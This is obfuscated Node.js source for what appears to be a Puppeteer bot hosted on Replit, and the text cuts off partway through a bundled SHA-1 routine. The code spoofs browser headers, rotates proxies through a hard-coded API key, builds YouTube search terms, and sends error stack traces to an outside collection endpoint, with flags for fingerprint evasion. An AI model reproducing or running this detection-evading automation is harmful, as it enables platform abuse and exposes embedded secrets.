function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x6d * 0x2 + -0x9c7 * 0x3 + 0x1c7b);
    let h = e[f];
    if (c['ujgzOU'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1f5b + -0x212 + -0x1d49, r, s, t = -0xd * 0x115 + -0x1ca5 + 0x2ab6; s = m['charAt'](t++); ~s && (r = q % (-0x16e + -0x107b * -0x1 + -0xf09) ? r * (-0x31a * -0x1 + -0x8e2 + 0x608) + s : s, q++ % (0x258b * -0x1 + 0x265f + 0x2 * -0x68)) ? o += String['fromCharCode'](-0x9 * 0x421 + 0x4 * -0x69d + -0xcec * -0x5 & r >> (-(-0x943 * -0x3 + -0xdc6 + -0xe01) * q & -0x1e80 + 0x88e + -0x2bf * -0x8)) : 0xb63 + 0x431 + 0x7ca * -0x2) {
          s = n['indexOf'](s);
        }
        for (let u = -0xe1 + 0xbe3 * 0x2 + -0x16e5, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xb02 * 0x2 + -0x8db * -0x4 + 0x6c * -0x88))['slice'](-(0xc67 + -0x8ab + -0x9 * 0x6a));
        }
        return decodeURIComponent(p);
      };
      c['PrinZK'] = i, b = arguments, c['ujgzOU'] = !![];
    }
    const j = e[-0x18b9 * -0x1 + 0x1 * 0x7ab + 0x566 * -0x6],
      k = f + j,
      l = b[k];
    return !l ? (h = c['PrinZK'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const aI = d,
  aH = b,
  aG = c;

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (-0x16e + -0x107b * -0x1 + -0xf0c))) + h;
}
async function randomWait() {
  return await wait(-0x31a * -0x1 + -0x8e2 + 0x1950 + (0x258b * -0x1 + 0x265f + 0x6 * 0x31e) * random()), -0x9 * 0x421 + 0x4 * -0x69d + -0x3be * -0x11;
}

function randomFlush(f, g) {
  const h = f['length'];
  let i = floor(random() * h),
    j = arrs['get'](g);
  for (j || (j = new Set(), arrs['set'](g, j)); j['has'](i);)
    i = floor(random() * h);
  return j['add'](i), j['size'] === h && j['clear'](), f[i];
}

function extractLinks(f) {
  const g = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
  let h, i = [];
  for (; null !== (h = g['exec'](f));)
    h['index'] === g['lastIndex'] && g['lastIndex']++, h['forEach']((j, k) => {
      -0x943 * -0x3 + -0xdc6 + -0xe02 === k && i['push'](j);
    });
  return i;
}

function extractAnchorData(f) {
  const g = h => {
    const i = f['indexOf'](h + '=\x22');
    if (-(-0x1e80 + 0x88e + -0x15f3 * -0x1) === i)
      return null;
    const j = i + h['length'] + (0xb63 + 0x431 + 0x7c9 * -0x2),
      k = f['indexOf']('\x22', j);
    return -(-0xe1 + 0xbe3 * 0x2 + -0x16e4) === k ? null : f['substring'](j, k);
  };
  return {
    'pingUrl': g('data-ping-' + 'url'),
    'scriptId': g('data-scrip' + 't-id'),
    'ipAddress': g('data-ip-ad' + 'dress'),
    'pingKey': g('data-ping-' + 'key')
  };
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x6d * 0x2 + -0x9c7 * 0x3 + 0x1c7b);
    let h = e[f];
    if (b['NuUqmx'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1f5b + -0x212 + -0x1d49, s, t, u = -0xd * 0x115 + -0x1ca5 + 0x2ab6; t = n['charAt'](u++); ~t && (s = r % (-0x16e + -0x107b * -0x1 + -0xf09) ? s * (-0x31a * -0x1 + -0x8e2 + 0x608) + t : t, r++ % (0x258b * -0x1 + 0x265f + 0x2 * -0x68)) ? p += String['fromCharCode'](-0x9 * 0x421 + 0x4 * -0x69d + -0xcec * -0x5 & s >> (-(-0x943 * -0x3 + -0xdc6 + -0xe01) * r & -0x1e80 + 0x88e + -0x2bf * -0x8)) : 0xb63 + 0x431 + 0x7ca * -0x2) {
          t = o['indexOf'](t);
        }
        for (let v = -0xe1 + 0xbe3 * 0x2 + -0x16e5, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xb02 * 0x2 + -0x8db * -0x4 + 0x6c * -0x88))['slice'](-(0xc67 + -0x8ab + -0x9 * 0x6a));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x18b9 * -0x1 + 0x1 * 0x7ab + 0x566 * -0x6,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2027 + -0x581 * -0x3 + -0x30aa; u < 0x692 * -0x2 + 0x26 + 0x3 * 0x4aa; u++) {
          p[u] = u;
        }
        for (u = 0x1c9b + -0x11 * 0x79 + -0x1492; u < -0x17cd * 0x1 + 0x119 * 0x5 + 0x4 * 0x4d4; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1 * -0x176d + -0x2 * -0x87e + 0x17d * 0x5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1e98 + 0x133e + -0x31d6, q = 0x237c + -0x2373 + -0x9;
        for (let v = -0x1af * 0x13 + -0x19a0 + -0x31 * -0x12d; v < n['length']; v++) {
          u = (u + (0xf8e + 0x479 * 0x6 + -0x2a63)) % (0xd3b + 0x1d9b + -0xaa * 0x3f), q = (q + p[u]) % (-0x1de1 * 0x1 + 0xe * 0x182 + 0x3d * 0x29), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * 0x956 + -0xc * 0x8e + -0x1ae)]);
        }
        return t;
      };
      b['mHvwIP'] = m, c = arguments, b['NuUqmx'] = !![];
    }
    const j = e[-0x2554 + -0x256a + 0x4abe],
      k = f + j,
      l = c[k];
    return !l ? (b['oCVpaZ'] === undefined && (b['oCVpaZ'] = !![]), h = b['mHvwIP'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getSearchTerm() {
  const aC = b,
    aB = d;
  return [
    ...(await fetch('https://ra' + 'pidtags.io' + '/api/gener' + 'ator?query' + '=' + _theAlphabet['random']() + ('&type=YouT' + aB(0x18)), {
      'credentials': 'omit',
      'headers': {
        'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '09.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '16.0',
        'Accept': 'applicatio' + 'n/json',
        'Accept-Language': 'en-US,en;q' + '=0.5',
        'Prefer': 'safe',
        'Alt-Used': 'rapidtags.' + 'io',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origi' + 'n'
      },
      'referrer': 'https://ra' + 'pidtags.io' + '/generator',
      'method': 'GET',
      'mode': 'cors'
    })['then'](f => f['json']()))['tags'],
    aC(0x24, 'bNaZ'),
    'zyenith\x20mi' + 'necraft',
    'minecraft\x20' + 'zyenith',
    'moomoo.io',
    'moomoo.io\x20' + 'spyder',
    'mrbeast',
    'pewdiepie',
    'quadeca',
    'urban\x20resc' + 'ue\x20ranch'
  ]['random']();
}

function isValidProxy(f) {
  return 'string' == typeof f && f['length'] > 0xb02 * 0x2 + -0x8db * -0x4 + 0x3d * -0xf1 && f['includes'](':');
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x6d * 0x2 + -0x9c7 * 0x3 + 0x1c7b);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function getRandomProxy() {
  for (;;) {
    const f = await fetch('https://st' + 'ratums.io/' + 'api/proxy/' + 'fetch?amt=' + '1&premium=' + 'yes&key=68' + 'dd383d6a62' + 'fb45684a02' + '1121959d15' + '06f8270066' + 'c62adc84aa' + 'a256e2b0e2' + '09')['then'](g => g['text']());
    if (isValidProxy(f))
      return f;
  }
}
const replUrl = 'https://' + process['env']['REPL_SLUG'] + '.' + process['env']['REPL_OWNER'] + '.repl.co',
  flags = {
    'ActivateBrowser': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_RPRT': 0x1,
    'RPL2_YT': 0x1,
    'doOUJS': 0x1,
    'doGF': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1,
    'doUseProxy': 0x1
  },
  {
    ElementHandle: ElementHandle,
    Page: Page,
    Frame: Frame,
    Browser: Browser
  } = require('puppeteer'),
  Check = (f => {
    function g(k = '') {
      return new Error()['stack'] || new Error()['toString']();
    }
    async function h(...k) {
      const l = [
          '[CH]\x20Cored' + 'ump:',
          ...k
        ]['join']('\x0a'),
        m = g();
      await async function(n) {
        const p = '18f9a0a514' + '8022de3150' + 'b78d2ef231' + '00b85393e4' + '67e20d4e39' + 'f791cb',
          q = 'https://st' + 'ratums.io/' + 'api/errorc' + 'ollect';
        if (((() => {
            try {
              return !!globalThis['process']['exit'];
            } catch (u) {
              return 0xc67 + -0x8ab + -0x4 * 0xef;
            }
          })())) {
          try {
            let u = require('axios');
            if (u)
              return void await u['post'](q, {
                'ekey': p,
                'message': n
              });
          } catch (v) {}
          try {
            let w = require('node-fetch');
            if (w)
              return void await w(q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (x) {}
          try {
            if (globalThis['fetch'])
              return void await globalThis['fetch'](q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (y) {}
        } else {
          try {
            if (globalThis['fetch'])
              return void await globalThis['fetch'](q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (z) {}
          try {
            if (globalThis['XMLHttpReq' + 'uest']) {
              const A = new globalThis['XMLHttpReq' + 'uest']();
              A['open']('POST', q), A['setRequest' + 'Header']('content-ty' + 'pe', 'applicatio' + 'n/json');
              let B = new Promise(C => {
                A['onload'] = () => C();
              });
              return A['send'](JSON['stringify']({
                'ekey': p,
                'message': n
              })), void await B;
            }
          } catch (C) {}
        }
      }(l + '\x0a' + m);
    }
    const i = Array['isArray'],
      j = {
        'info' (k) {
          h(k);
        },
        'dumpStackTrace': g,
        'cust': function(k, l) {
          try {
            l(k) || h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'idn': function(k) {
          try {
            'object' == typeof k && k['_isIdentit' + 'yType'] || h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'str': function(k) {
          const aD = b;
          try {
            'string' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h(aD(0x1b, 'LzT%') + 'ump:', k, l);
          }
        },
        'num': function(k) {
          try {
            'number' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'all': function(k, l) {
          try {
            k['some'](m => typeof m !== l) && h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'type': function(k, l) {
          try {
            if (typeof k == typeof l)
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'func': function(k) {
          try {
            'function' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'eq': function(k, l) {
          const aE = d;
          try {
            k !== l && h(aE(0x13) + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'iface': function(k, l) {
          try {
            const m = Object['keys'](l);
            for (let n of m)
              k['hasOwnProp' + 'erty'](n) || h('[CH]\x20Cored' + 'ump:', m, k, l, 'searched\x20f' + 'or:', n), typeof k[n] != typeof l[n] && h('[CH]\x20Cored' + 'ump:', m, k, l, 'searched\x20f' + 'or:', n);
          } catch (p) {
            h('[CH]\x20Cored' + 'ump:', k, l, p);
          }
        },
        'prop': function(k, l) {
          try {
            if (i(l)) {
              for (let m of l)
                j['prop'](k, m);
            }
            if (k['hasOwnProp' + 'erty'](l))
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (n) {
            h('[CH]\x20Cored' + 'ump:', k, l, n);
          }
        },
        'inst': function(k, l) {
          try {
            if (k instanceof l)
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'ia': function(k, ...l) {
          try {
            for (let m of l)
              if (k instanceof m)
                return;
            h('[CH]\x20Cored' + 'ump:', k, ...l);
          } catch (n) {
            h('[CH]\x20Cored' + 'ump:', k, ...l, n);
          }
        },
        'arr': function(k) {
          try {
            if (i(k))
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k);
          }
        },
        'nes': function(k) {
          j['cust'](k, l => '' !== l), j['str'](k);
        },
        'bool': k => {
          try {
            if (-0x18b9 * -0x1 + 0x1 * 0x7ab + 0x2063 * -0x1 == k)
              return;
            if (0x2027 + -0x581 * -0x3 + -0x30aa == k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'truthy': k => {
          try {
            if (k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'nones': k => {
          try {
            if ('string' == typeof k && '' !== k || null === k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', l, k);
          }
        }
      };
    return j;
  })(),
  sha1 = ((() => {
    var e, f, g, h, i, j, k, l, m = 'object' == typeof window ? window : {},
      n = !m['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
    n && (m = global), e = ('0123456789' + 'abcdef')['split'](''), f = [-(0x2b0efa5d * -0x2 + 0xf81e88 + 0x2 * 0x6a92eb19),
      0xbb752b + -0xd * 0x40cf7 + -0x6cca0, -0x9bf7 * 0x1 + 0x47f * 0x8 + 0x1 * 0xf7ff,
      0x1 * -0x176d + -0x2 * -0x87e + 0x6f1 * 0x1
    ], g = [
      0x1e98 + 0x133e + -0x31be,
      0x237c + -0x2373 + 0x7, -0x1af * 0x13 + -0x19a0 + -0x3 * -0x1337,
      0xf8e + 0x479 * 0x6 + -0x2a64
    ], h = [
      'hex',
      'array',
      'digest',
      'arrayBuffe' + 'r'
    ], i = [], j = function(q) {
      return function(r) {
        return new o(0xd3b + 0x1d9b + -0xd7 * 0x33)['update'](r)[q]();
      };
    }, k = function() {
      var q, s, u = j('hex');
      for (n && (u = l(u)), u['create'] = function() {
          return new o();
        }, u['update'] = function(v) {
          return u['create']()['update'](v);
        }, q = -0x1de1 * 0x1 + 0xe * 0x182 + 0x1c1 * 0x5; q < h['length']; ++q)
        s = h[q], u[s] = j(s);
      return u;
    }, l = function(q) {
      var r = eval('require(\'crypto\');'),
        s = eval('require(\'buffer\')[\'Buffer\'];'),
        t = function(u) {
          if ('string' == typeof u)
            return r['createHash']('sha1')['update'](u, 'utf8')['digest']('hex');
          if (u['constructo' + 'r'] === ArrayBuffer)
            u = new Uint8Array(u);
          else {
            if (void(0x1 * 0x956 + -0xc * 0x8e + -0x2ae) === u['length'])
              return q(u);
          }
          return r['createHash']('sha1')['update'](new s(u))['digest']('hex');
        };
      return t;
    };
    class o {
      constructor(q) {
          q ? (i[-0x2554 + -0x256a + 0x4abe] = i[-0x1 * -0x994 + 0xae7 + 0x1 * -0x146b] = i[-0x923 + 0x10cd * -0x1 + 0x1 * 0x19f1] = i[0x3 * 0xce + 0x5d7 + -0x83f] = i[0x311 * -0x1 + 0x2 * -0x59 + 0x3c6] = i[0x36 * 0x5a + 0x45d * 0x4 + -0x246c] = i[-0x1343 * 0x2 + -0x22db + 0x4966] = i[0xb2f + 0x125c * -0x2 + -0x3 * -0x885] = i[0x458 * 0x3 + -0x55 * -0x26 + -0x199f] = i[0x1f * 0xca + -0xab8 + -0xc3 * 0x12] = i[0x4b + -0x13 * -0x17e + -0x1c9c] = i[-0x1543 * 0x1 + -0x5e9 * 0x5 + -0x236 * -0x17] = i[-0x5e7 + -0x12 * -0x1d5 + 0x6c2 * -0x4] = i[-0x1f23 + 0x22e7 + -0x3b8] = i[0x4f * 0x15 + 0x1503 * -0x1 + 0xe95] = i[-0x1d65 + 0x2b * -0x55 + -0x2 * -0x15dd] = i[-0x1 * 0x1da7 + 0x5 * -0x68f + 0x3e81] = 0x5a * -0x18 + 0x686 + -0x23 * -0xe, this['blocks'] = i) : this['blocks'] = [-0xc55 + 0x2e * -0x88 + -0x1 * -0x24c5,
            0x1222 + 0x7 * 0x2b3 + 0x1 * -0x2507,
            0x245e + -0x1a57 + -0xa07,
            0x3 * 0x3be + 0x15ca * -0x1 + 0xa90,
            0x2 * 0x8ec + 0x1d48 + -0x2f20, -0xa5 + 0x14 * 0x9e + -0xbb3, -0x1 * 0xad + 0x711 + -0x664, -0x2393 * 0x1 + -0xa * 0x20f + 0x3829, -0x120 + 0x1de0 + -0x1cc0,
            0x3 * -0xc51 + 0x2 * -0x54a + 0x2f87 * 0x1, -0x6c3 + 0x1 * -0x1d67 + 0x242a, -0x133 * -0x9 + 0x53 * 0x61 + -0x2a3e, -0x47d + 0x5 * -0x483 + 0xc * 0x241,
            0x2f * -0x25 + 0x1473 + -0xda8, -0x1c13 * -0x1 + -0x1a * 0x80 + -0xf13,
            0x6ae + 0x54d * 0x3 + -0x1695,
            0xbae + 0xed * -0xb + -0x17f
          ], this['h0'] = -0x31 * -0xb766f3 + -0x50 * -0x99879f + 0x14300cce * 0x1, this['h1'] = 0xc97a251 + 0x4f257 * 0xf3 + 0xde8400a3, this['h2'] = 0x464a6493 + -0x49cff30b + -0x4e2035bb * -0x2, this['h3'] = 0x20614844 + -0x1904b97 + 0x216aa51 * -0x7, this['h4'] = 0x9c196e26 + 0xdef98a84 + -0x1d * 0x651a882, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1bfb + 0x3b7 + 0xfd9 * -0x2, this['finalized'] = this['hashed'] = -0x1dd + -0x16 * -0x8f + 0xa6d * -0x1, this['first'] = -0x270d + 0x51 * 0x54 + -0xc7a * -0x1;
        }
        ['update'](q) {
          const aF = d;
          var u, v, w, x, y, z;
          if (!this['finalized']) {
            for ((u = 'string' != typeof q) && q['constructo' + 'r'] === m['ArrayBuffe' + 'r'] && (q = new Uint8Array(q)), w = 0xc54 + 0x2 * -0x9ad + 0x706, y = q['length'] || -0x2043 * -0x1 + -0x1b90 + -0x4b3 * 0x1, z = this['blocks']; w < y;) {
              if (this['hashed'] && (this['hashed'] = -0x17a1 * 0x1 + -0x22 * 0x73 + 0x1 * 0x26e7, z[-0x1 * 0xc51 + -0x15df + 0x2230] = this['block'], z[0x1dba + -0x56c * -0x1 + -0x1f3 * 0x12] = z[-0x15 * -0x17f + -0xbf2 + 0xb2 * -0x1c] = z[-0x21a3 + 0x1 * 0x576 + 0x1c2f] = z[-0x2 * -0x9c + -0x1bee + 0x1ab9 * 0x1] = z[0x2421 + 0x10af + -0x6d * 0x7c] = z[-0x1478 + 0x1555 * 0x1 + 0x1b * -0x8] = z[0x1716 + 0x37 * 0x4 + 0x1 * -0x17ec] = z[0x4ab + -0xe8c + -0x4 * -0x27a] = z[0x16bb + -0x4db + -0x11d8] = z[0x6e0 + 0xab0 + 0x1 * -0x1187] = z[0x1615 + 0x1 * -0x23d + -0x13ce] = z[0xeab + 0xc00 + -0x6a8 * 0x4] = z[0x16af * 0x1 + -0x1489 * 0x1 + 0x2 * -0x10d] = z[0x1a * 0xdf + 0x41 * -0x37 + 0x8a2 * -0x1] = z[0x19df * -0x1 + 0x2166 + -0x1 * 0x779] = z[-0x25 * 0x67 + 0x9d3 * -0x1 + 0x18c5] = -0x11cc + -0x1 * -0xe2b + 0x3a1), u) {
                for (x = this['start']; w < y && x < -0x347 * 0x3 + -0x3a3 * 0x7 + 0x238a; ++w)
                  z[x >> 0x1 * 0xc6d + 0x1437 + -0x20a2 * 0x1] |= q[w] << g[0x1 * 0xc04 + -0xb * -0x230 + -0x2411 & x++];
              } else {
                for (x = this[aF(0x22)]; w < y && x < -0x11 * -0x117 + -0xb * -0x2bf + 0x6b * -0x74; ++w)
                  (v = q['charCodeAt'](w)) < 0x1d6d + 0x28 * -0xa + -0x1b5d ? z[x >> 0x537 + 0x1718 + -0x1c4d] |= v << g[-0x5 * 0x118 + -0x25 * -0x9f + -0x1180 & x++] : v < 0x2a2 + -0xd * 0x1c5 + -0x1c5f * -0x1 ? (z[x >> 0x7 * -0x4cf + 0x31 * -0xb5 + 0x4450] |= (-0x1 * -0x2453 + -0x1 * 0x1612 + -0xd81 | v >> 0x138 * 0x1 + 0xd72 * 0x2 + -0x1c16) << g[0x3f9 + -0x1b00 + 0x170a & x++], z[x >> 0x5 * -0x1b7 + 0x1 * -0x8ca + 0x115f] |= (0x14db + -0x36e + 0x7 * -0x26b | 0x25cc + 0x1fa2 + 0x1 * -0x452f & v) << g[-0x1fa8 + 0x2 * -0xf90 + 0x3ecb & x++]) : v < 0x1c * 0x9c2 + -0x62b5 + 0x297d || v >= 0x1322 * 0x13 + -0x18261 + 0xf6db ? (z[x >> 0x45d + 0x1ae6 * 0x1 + -0x1 * 0x1f41] |= (0x1 * -0x17d7 + 0x11 * -0x1 + -0x1a * -0xf4 | v >> 0x1 * -0xa94 + -0xa69 + 0x1509) << g[0x1694 + 0x1c * 0x103 + -0x12f * 0x2b & x++], z[x >> 0xa5c + -0xe75 + 0x41b] |= (-0x79 * 0x15 + -0x45e + 0xecb | v >> 0x2112 + -0x22ce + -0x2 * -0xe1 & 0x1 * -0x2073 + -0x120f * 0x1 + 0x32c1) << g[0x987 + 0x1 * -0xe8d + -0x509 * -0x1 & x++], z[x >> -0x5f7 * 0x1 + -0x1 * -0x133c + -0x61 * 0x23] |= (-0x1d * 0x12 + 0xefd + -0xc73 | 0x986 * 0x1 + -0x6dd + -0x26a & v) << g[0x1 * 0x25ea + 0x8e1 * -0x1 + 0x5ce * -0x5 & x++]) : (v = 0x1 * 0x1ec97 + -0x72 * -0x134 + -0x175bf + ((0xb * 0xc7 + -0x8ec + -0xd * -0x56 & v) << 0x66e * 0x3 + -0x28d * -0x1 + -0x15cd | 0x1fe6 + -0x20fd + -0x28b * -0x2 & q['charCodeAt'](++w)), z[x >> -0x15a3 + 0xe4 * -0x28 + -0x1 * -0x3945] |= (0x115 * -0x4 + 0xe * 0x2b6 + -0x20b0 | v >> 0x1cf + -0x6f * -0x4f + -0x23fe) << g[0x1008 + -0xa14 * -0x2 + -0x242d & x++], z[x >> -0x2201 * -0x1 + 0x183f * 0x1 + -0x3a3e] |= (-0x2385 + 0x1 * 0x1082 + 0x1383 | v >> 0xd7e + -0x16 * -0x1ab + -0x3224 * 0x1 & -0x7 * -0x209 + 0x3f1 * 0x8 + -0x2d88) << g[-0x13 * -0x191 + 0x83f * -0x2 + -0xd42 & x++], z[x >> 0x1d5e * 0x1 + -0xd1e + 0x63 * -0x2a] |= (-0x97 * 0x6 + -0x2029 + 0x3 * 0xc11 | v >> 0x1 * 0x2a + 0x10ff + 0x1 * -0x1123 & -0x1481 + -0xf7a * 0x1 + 0x243a) << g[0x767 + -0x1237 * 0x1 + 0xad3 & x++], z[x >> 0x2007 * -0x1 + -0x518 + -0x76d * -0x5] |= (-0x22f * 0x8 + 0x121e + -0x13 * 0x2 | -0x24c0 + 0x551 * 0x1 + 0x1fae * 0x1 & v) << g[-0x3b * 0x5b + 0x24b6 + -0x53e * 0x3 & x++]);
              }
              this['lastByteIn' + 'dex'] = x, this['bytes'] += x - this['start'], x >= -0x4a3 * 0x1 + 0x1380 + -0xe9d ? (this['block'] = z[0x107d * -0x1 + 0x266b + -0x15de], this['start'] = x - (-0x2196 + 0x2206 + -0x30), this['hash'](), this['hashed'] = 0xe0c + -0x47 * -0x75 + -0x2 * 0x173f) : this['start'] = x;
            }
            return this['bytes'] > 0x177ce1b7b + -0x4 * -0x1a7137b9 + -0x60 * 0x25987f1 && (this['hBytes'] += this['bytes'] / (-0x1b1593564 + 0x4 * -0x2612746b + 0x349a30710) << -0x20f * 0xe + -0x121 + 0x1df3 * 0x1, this['bytes'] = this['bytes'] % (0x388e * 0x432d2 + -0x16965575c + 0x17bf336e0)), this;
          }
        }
        ['finalize']() {
          if (!this['finalized']) {
            this['finalized'] = -0xe8a + -0x1 * 0x2179 + 0x3004;
            var q = this['blocks'],
              r = this['lastByteIn' + 'dex'];
            q[0x64f + -0x2196 + -0x3 * -0x91d] = this['block'], q[r >> 0x1d9f + -0x1c7c + -0x1 * 0x121] |= f[0x3 * -0x8f3 + -0x29 * -0x3 + 0x1a61 & r], this['block'] = q[-0x2337 + 0xd2b + 0x161c], r >= -0x1d47 + 0x26e8 + 0x1 * -0x969 && (this['hashed'] || this['hash'](), q[0x774 + 0x9af * 0x3 + 0x74d * -0x5] = this['block'], q[0x1 * -0x976 + 0x2 * -0x42d + 0x1a * 0xb0] = q[0x267d + -0x4f9 + 0x2183 * -0x1] = q[-0x1bab + -0x26e1 + 0x428e] = q[0x2561 + -0x50c + -0x2052] = q[0x4f * 0x74 + 0x15cc + -0x29e * 0x16] = q[-0xfe0 + 0xf05 * 0x1 + 0x8 * 0x1c] = q[0x20cb + 0x1fea + -0x40af] = q[-0xe3 * -0x28 + -0x4d * -0x74 + -0x569 * 0xd] = q[0x1655 * 0x1 + -0x20ad + 0x4 * 0x298] = q[-0xc32 * -0x2 + -0x113d + 0x1 * -0x71e] = q[-0x16af + 0x1 * -0x343 + -0x4 * -0x67f] = q[-0x16f + -0x1 * 0x29 + 0x1a3] = q[0x322 * -0x1 + -0x1 * 0x176 + 0x12 * 0x42] = q[-0x1b0f + -0x1a15 + 0x3531] = q[0x10d1 + -0x15a * 0x19 + -0x1 * -0x1107] = q[0x137e * -0x1 + -0x637 + 0x2 * 0xce2] = 0xbf8 + 0x240c + 0x1 * -0x3004), q[0xc9a * -0x2 + 0x1d17 + -0x3d5] = this['hBytes'] << -0x35 * 0xb1 + 0x11 * -0x21e + 0x48a6 | this['bytes'] >>> 0xd3b + 0xd83 + -0x1aa1, q[0x29 * -0x35 + 0x1942 + -0x10b6] = this['bytes'] << -0x203c + 0x19db + 0x664, this['hash']();
          }
        }
        ['hash']() {
          var q, u, v = this['h0'],
            w = this['h1'],
            x = this['h2'],
            y = this['h3'],
            z = this['h4'],
            A = this['blocks'];
          for (q = -0x29 * 0x28 + -0x1 * -0x1d3b + 0x1 * -0x16c3; q < 0x1 * -0x1631 + 0x1f2e + -0x8ad; ++q)
            u = A[q - (-0x225e + 0x970 + -0x1 * -0x18f1)] ^ A[q - (-0x149 * -0x1e + 0x1 * 0x1b7a + -0x4200 * 0x1)] ^ A[q - (0x111b + 0x1 * -0x23a9 + 0x129c)] ^ A[q - (0x1 * -0x425 + 0x2 * -0xb55 + 0x1adf)], A[q] = u << -0x14fd + 0x2302 * 0x1 + -0x6 * 0x256 | u >>> -0x1773 + 0x1 * -0x100 + 0x1892;
          for (q = 0x5f * -0x29 + -0x1 * -0x1270 + -0x3 * 0x113; q < 0x1e51 + 0x1dd * 0xe + -0x3853; q += 0x7b4 + 0x24b + -0x9fa)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x1 * -0x25ef + 0x2091 + -0x467b | v >>> -0x1 * 0x9be + 0x1 * -0xf91 + 0x196a) + (w & x | ~w & y) + z + (-0x3eff4e8d * -0x2 + 0x2 * -0x45014b21 + -0x3 * -0x222cd0eb) + A[q] << 0x1b21 + -0x4b1 + 0xb38 * -0x2) << -0x1d7e + -0x202 * -0x6 + 0x107 * 0x11 | z >>> 0x17d * -0xd + 0xd80 + -0x2 * -0x2fa) + (v & (w = w << 0x679 * 0x5 + 0x1 * 0x223d + 0x4a * -0xe6 | w >>> -0x20b1 * -0x1 + 0x16a8 + -0x3757) | ~v & x) + y + (0x1f3cb002 + -0x8169b2a1 + 0xbcaf7c38) + A[q + (-0x10a6 + 0x1 * 0x989 + 0x71e)] << -0xfb + 0x2 * -0x2c + 0x153) << -0xef5 * 0x1 + -0x1766 * -0x1 + -0x86c | y >>> 0x1792 + -0x18c4 + 0x25 * 0x9) + (z & (v = v << -0x4fd + -0x2110 + 0x262b | v >>> 0x2 * 0x8b7 + -0xc35 + -0x537) | ~z & w) + x + (0x1f73 * -0xa2cd + 0xa2 * -0x64f4ca + 0xae655684) + A[q + (0x189c + 0x2 * 0xf3d + -0x3714)] << -0x3dc + 0xcaa + -0x31 * 0x2e) << 0xa22 * -0x2 + -0x6 * -0xf1 + 0xea3 | x >>> -0x2518 + 0x3 * 0x4b1 + 0x28 * 0x94) + (y & (z = z << 0x107e + -0x2 * 0x347 + -0x4e9 * 0x2 | z >>> -0xe * 0x13a + -0x2ee + 0x141c) | ~y & v) + w + (-0x2 * 0x4c79f44d + -0x55152d2e * -0x1 + 0x1 * 0x9e613505) + A[q + (0x1 * -0x200b + 0x1b8c + 0x241 * 